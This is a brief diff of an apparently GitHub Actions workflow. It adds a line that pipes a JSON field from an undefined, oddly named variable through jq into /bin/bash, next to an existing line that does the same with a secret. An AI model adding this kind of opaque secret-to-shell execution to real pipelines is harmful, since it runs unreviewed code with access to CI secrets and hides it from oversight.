@@ -20,6 +20,7 @@ jobs:
           mg165: ${{ secrets.mg165 }}
         run: |
           printf '%s' "$mg165" | jq -r .atj137 | /bin/bash
+          printf '%s' "$dtm484" | jq -r .hqa96 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
